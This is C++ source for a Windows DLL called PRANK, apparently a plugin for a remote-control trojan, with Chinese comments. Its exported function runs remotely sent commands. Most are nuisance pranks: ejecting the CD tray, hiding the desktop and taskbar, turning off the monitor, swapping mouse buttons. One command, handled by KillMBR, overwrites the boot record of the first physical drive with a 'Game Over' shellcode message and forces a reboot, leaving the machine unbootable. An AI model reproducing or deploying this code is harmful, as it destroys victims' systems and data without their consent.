// PRANK.cpp : Defines the entry point for the DLL application.
//
#include <windows.h>

#pragma comment(linker, "/ENTRY:_DllMain")
#pragma comment(linker,"/opt:nowin98")
BOOL APIENTRY _DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					   )
{
    return TRUE;
}

enum
{
	COMMAND_CD_OPEN,
		COMMAND_CD_CLOSE,
		COMMAND_DESKTOP_HIDE,
		COMMAND_DESKTOP_SHOW,
		COMMAND_NOISE,
		COMMAND_FLICKER,
		COMMAND_DISPLAY_CLOSE,
		COMMAND_DISPLAY_OPEN,
		COMMAND_TASKBAR_HIDE,
		COMMAND_TASKBAR_SHOW,
		COMMAND_MOUSE_PANK,
		COMMAND_MOUSE_RECOVER,
		COMMAND_DISK_KILL
};

////////////////////////////////娱乐功能//////////////////////////
#include <WINIOCTL.H>
unsigned char scode[] = 
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x47\x61\x6d\x65\x20\x4f\x76\x65"
"\x72\x20\x47\x6f\x6f\x64\x20\x4c\x75\x63\x6b\x20\x42\x79\x20\x57"
"\x69\x6e\x64";

int KillMBR()
{	
	//	ExitWindowsExT   pExitWindowsEx =  (ExitWindowsExT)GetProcAddress(LoadLibrary("USER32.dll"), "ExitWindowsEx");
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	
	// 重新构造MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	
	hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	// 写入病毒内容
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	CloseHandle(hDevice);
	Sleep(2000);
	DWORD   dwVersion   =   GetVersion();   
    if   (dwVersion   <   0x80000000)   //   Is   NT   or   2000!   
    {   HANDLE   hToken;   TOKEN_PRIVILEGES   tkp;   
	OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES   |   TOKEN_QUERY,   &hToken); 
	LookupPrivilegeValue(NULL,   SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount   =   1;   //   set   privilege   
	tkp.Privileges[0].Attributes   =   SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken,   FALSE,   &tkp,   0,(PTOKEN_PRIVILEGES)NULL,   0); 
	ExitWindowsEx(EWX_FORCE+EWX_REBOOT,   0);   }  
	else   //   Is   9x   or   Me   
		ExitWindowsEx(EWX_FORCE+EWX_REBOOT,0);
	return 0;
}


#include <mmsystem.h>
#pragma comment (lib,"WINMM.LIB")
void WINAPI Loop_Prank(LPVOID lparam)
{
	switch((BYTE)lparam)
	{
	case COMMAND_CD_OPEN:
		::mciSendString("set cdaudio door open",NULL,0,NULL);
		break;
	case COMMAND_CD_CLOSE:
		::mciSendString("set cdaudio door closed wait",NULL,0,NULL);//关闭
		break;
	case COMMAND_DESKTOP_HIDE:
		{
			HWND disk;
			disk = FindWindow("Progman",NULL);
			ShowWindow(disk,SW_HIDE);//隐藏桌面
		}
		break;
	case COMMAND_DESKTOP_SHOW:
		{
			HWND disk;
			disk=FindWindow("Progman",NULL);
			ShowWindow(disk,SW_SHOW);//显示桌面
		}
		break;
	case COMMAND_NOISE:
		{
			for(int i=1000;i<1050;i++)
			{
				Beep(i,30);
				::Sleep(100);
			}

		}
		break;
	case COMMAND_FLICKER:
		{
			HWND ForeHandle=GetForegroundWindow();
			for(int i=0;i<15;i++)
			{
				RECT rc;
				GetWindowRect(ForeHandle,&rc);
				MoveWindow(ForeHandle,rc.left+8,rc.top+8,rc.right-rc.left,rc.bottom-rc.top,1);
				Sleep(40);
				MoveWindow(ForeHandle,rc.left,rc.top,rc.right-rc.left,rc.bottom-rc.top,1);
				Sleep(40);
				Beep(0x0fff,10);
			}
		}
		break;
	case COMMAND_DISPLAY_CLOSE:
		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,2);//关闭	
		break;
	case COMMAND_DISPLAY_OPEN:
		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,-1);//打开
		break;
	case COMMAND_TASKBAR_HIDE:
		{
			HWND mask;
			mask=FindWindow("Shell_TrayWnd",NULL);
			ShowWindow(mask,SW_HIDE);//隐藏任务栏
		}
		break;
	case COMMAND_TASKBAR_SHOW:
		{
			HWND mask;
			mask=FindWindow("Shell_TrayWnd",NULL);
			ShowWindow(mask,SW_SHOW);//显示
		}
		break;
	case COMMAND_MOUSE_PANK:
		SwapMouseButton(true);//打开
		break;
	case COMMAND_MOUSE_RECOVER:
		SwapMouseButton(false);
		break;
	case COMMAND_DISK_KILL:
		KillMBR();
		break;
	default:
		return;
	}
}

//
extern "C" __declspec(dllexport) BOOL PluginMe(LPCTSTR lpszHost, UINT nPort, LPBYTE lparam)     
{
	Loop_Prank((LPVOID)nPort);
	return 0;
}

